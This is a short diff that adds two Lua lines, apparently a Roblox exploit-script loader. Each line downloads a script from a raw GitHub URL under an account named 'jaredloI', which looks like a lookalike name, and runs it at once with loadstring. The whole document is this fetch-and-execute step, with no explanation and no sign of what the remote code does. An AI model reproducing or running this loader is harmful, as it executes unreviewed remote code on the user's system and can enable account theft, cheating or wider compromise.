@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/altctrlper/main/user'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/altctrlper/main/main'))()
